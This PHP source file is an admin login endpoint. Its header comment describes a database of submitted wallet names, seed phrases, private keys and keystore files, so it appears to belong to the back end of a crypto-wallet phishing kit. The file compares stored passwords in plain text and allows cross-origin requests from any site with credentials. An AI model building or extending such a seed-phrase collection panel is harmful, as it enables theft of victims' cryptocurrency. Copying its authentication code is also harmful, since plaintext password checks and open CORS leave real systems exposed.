<?php

/*
Data to be received:
Format: [
    wallet_name: ''
    auth_type: phrase || privatekey || keystoreJSON
    auth_text: ''
    auth_file: '' || null
]

Database schema:
Schema(wallets): [
    id, wallet_name, auth_type, auth_text, auth_file, date_added
]
Schema(admin): [
    id, email, password, date_added
]
*/

require 'classes/dbconn.class.php';
require 'classes/users.class.php';

use Src\Database\AdminManager ;
use Src\System\DatabaseConnector ;

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Content-Type: application/json; charset=UTF-8");
header("Access-Control-Allow-Methods: OPTIONS,GET,POST,PUT,DELETE");
header("Access-Control-Max-Age: 3600");
header("Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With");


// get request data and output as object
// $data = file_get_contents("php://input");
// $data = json_decode($data, true);
$data = array(
    'email' => $_POST['email'],
    'password' => $_POST['password']
);


$process_form = new ProcessForm($data);
$response = $process_form->process();
echo json_encode($response);


class ProcessForm
{

    private $data;
    private $dbConnection;
    private $dbManager;

    function __construct($data)
    {
        $this->table = 'admin';
        // separate data variables
        $this->data = $data;
        $email = $data['email'];
        $password = $data['password'];

        $this->email = $email;
        $this->password = $password;

        // connect to database
        $dbConnection = (new DatabaseConnector)->getConnection();
        $dbConnection->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);  //throw errors from all aspects of database connection
        $this->dbConnection = $dbConnection;

        $this->response_array = array(
            "data" => '',
            "info" => array(),
            "error" => array()
        );
    }

    public function process()
    {
        // check if data is validated; if not, return false
        array_push($this->response_array["info"], 'Validating data...');
        $validated_data = $this->validate_data();

        if(!$validated_data) {
            $response = 'Invalid data!';
            array_push($this->response_array["error"], $response);
            return false;
        }

        // initialize database manager
        $dbManager = new AdminManager($this->dbConnection, $this->table);

        // save validated data in database
        array_push($this->response_array["info"], 'Checking if user exists...');
        $status = $this->check_if_user_exists($dbManager, $validated_data); // returns true or response text
        
        $response = ($status == 'ok') ? 'success' : $status;
        $this->response_array["data"] = $response;

        return $this->response_array;
    }

    function validate_data()
    {
        $data_array = [
            'email' => htmlspecialchars($this->email, ENT_QUOTES),
            'password' => htmlspecialchars($this->password, ENT_QUOTES)
        ];

        if (empty($data_array['email']) || empty($data_array['password']))
        {
            array_push($this->response_array["error"], 'Some fields are empty');
            return false;
        }

        return $data_array;
    }

    function save_data($dbManager, $data_array)
    {
        $data_array = (array) $this->data;
        $result = $dbManager->insert($data_array);
        $response = ($result == '1') ? 'success' : $result;
        
        return $response;
    }

    function check_if_user_exists($dbManager, $data_array){
        
        $result = $dbManager->find_one($param = 'email', $value = $data_array["email"]);
        
        if($result){
            $user_exists = ($result[0]['password'] == $data_array["password"]) ? 'ok' : 'Incorrect password!';
        }else{
            $user_exists = 'Email does not exist!';
        }
        
        return $user_exists;
    }
}
